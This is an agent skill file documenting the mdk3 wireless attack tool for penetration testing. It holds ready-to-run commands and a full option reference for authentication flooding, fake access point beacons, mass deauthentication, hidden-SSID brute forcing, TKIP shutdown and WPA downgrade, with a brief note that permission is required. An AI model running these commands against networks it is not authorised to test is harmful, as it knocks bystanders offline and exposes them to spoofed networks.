---
name: mdk3
description: Exploit IEEE 802.11 protocol weaknesses to perform various wireless attacks including beacon flooding, authentication DoS, deauthentication, and SSID brute-forcing. Use when performing wireless penetration testing, testing AP stability, auditing WIDS/WIPS, or attempting to decloak hidden SSIDs.
---

# mdk3

## Overview
MDK3 (Murder Death Kill 3) is a proof-of-concept tool used to exploit common IEEE 802.11 protocol weaknesses. It operates at the Layer 2 level to disrupt wireless networks, test hardware stability, and bypass certain security measures like MAC filtering or hidden SSIDs. Category: Wireless Attacks.

## Installation (if not already installed)
Assume mdk3 is already installed. If the command is missing:

```bash
sudo apt install mdk3
```

## Common Workflows

### Authentication DoS
Flood Access Points with authentication requests to exhaust their resources or freeze them.
```bash
mdk3 wlan0mon a
```

### Beacon Flooding (Fake APs)
Generate numerous fake Access Points to confuse scanners or users.
```bash
mdk3 wlan0mon b -n "Free WiFi" -c 6
```

### Deauthentication (Amok Mode)
Disconnect all clients from a specific AP or all APs in range.
```bash
mdk3 wlan0mon d -w /path/to/whitelist.txt
```

### SSID Brute Force
Attempt to discover the name of a hidden SSID using a wordlist.
```bash
mdk3 wlan0mon p -f /usr/share/wordlists/dnsmap.txt -t <BSSID>
```

## Complete Command Reference

```bash
mdk3 <interface> <test_mode> [test_options]
```

### Test Modes

| Mode | Name | Description |
|------|------|-------------|
| `b` | Beacon Flood | Sends beacon frames to show fake APs at clients. |
| `a` | Authentication DoS | Sends authentication frames to all APs found in range. |
| `p` | Basic Probing / SSID Brute | Probes APs and checks for answers; includes SSID brute-forcing. |
| `d` | Deauthentication Amok | Kicks everyone found from the AP (Deauth/Disassociation). |
| `m` | Michael Shutdown | TKIP exploitation; cancels all traffic continuously. |
| `x` | 802.1X Tests | Tests against 802.1X implementations. |
| `w` | WIDS/WIPS Confusion | Confuse or abuse Intrusion Detection/Prevention Systems. |
| `f` | MAC Filter Brute | Bruteforce MAC filters using known client addresses. |
| `g` | WPA Downgrade | Deauthenticates WPA stations to force a downgrade to WEP/Open. |

### Test Options (by Mode)

#### Beacon Flood Mode (b)
- `-n <ssid>`: Use SSID instead of randomly generated ones.
- `-f <filename>`: Read SSIDs from file.
- `-v <filename>`: Read MACs and SSIDs from file.
- `-t <adhoc>`: Create Ad-Hoc network (1) or Managed (0, default).
- `-w <enc_type>`: Set encryption (W=WEP, T=TKIP, A=AES).
- `-b <bitrate>`: Set bitrate.
- `-m`: Use valid MAC addresses from OUI database.
- `-h`: Hop to the channel where the target AP is (requires `-n` or `-f`).
- `-c <chan>`: Create fake APs on this channel.
- `-s <pps>`: Set speed in packets per second (default: 50).

#### Authentication DoS Mode (a)
- `-a <ap_mac>`: Only test the specified AP.
- `-m`: Use valid client MAC addresses from OUI database.
- `-c`: Do not check if the test was successful (speed boost).
- `-i <ap_mac>`: Perform intelligent test (check if AP is frozen).
- `-s <pps>`: Set speed in packets per second (default: unlimited).

#### Probing / SSID Brute Mode (p)
- `-e <ssid>`: SSID to probe for.
- `-f <filename>`: Read SSIDs from file for brute-forcing hidden SSIDs.
- `-t <bssid>`: Set BSSID of the target AP.
- `-s <pps>`: Set speed (default: 400).
- `-b <character_set>`: Use full brute force (n=numbers, u=uppercase, l=lowercase, s=symbols).

#### Deauthentication Amok Mode (d)
- `-w <filename>`: Read MAC addresses from whitelist (clients/APs not to kick).
- `-b <filename>`: Read MAC addresses from blacklist (only kick these).
- `-s <pps>`: Set speed (default: unlimited).
- `-c [chan,chan,...]`: Enable channel hopping.

#### Michael Shutdown Exploitation (m)
- `-t <bssid>`: Target AP BSSID.
- `-w <seconds>`: Wait between bursts (default: 10).
- `-n <number>`: Number of packets per burst (default: 100).
- `-j`: Use the new "TKIP-Kill" method.

#### WIDS/WIPS Confusion (w)
- `-e <ssid>`: SSID of the target WIDS.
- `-f <filename>`: Read SSIDs from file.
- `-c [chan,chan,...]`: Enable channel hopping.
- `-t <bssid>`: Target AP BSSID.

#### MAC Filter Brute Mode (f)
- `-t <bssid>`: Target AP BSSID.
- `-m <mac_prefix>`: Set MAC address prefix (e.g., 00:12:34).
- `-f <filename>`: Read MAC addresses from file.

#### WPA Downgrade Test (g)
- `-t <bssid>`: Target AP BSSID.

## Notes
- **Interface**: The interface must be in **Monitor Mode** (e.g., using `airmon-ng start wlan0`).
- **Legal**: Only use this tool on networks you have explicit permission to test.
- **Stability**: Some modes (like Beacon Flooding) can crash not only the target AP but also local network management software or drivers on the attacking machine.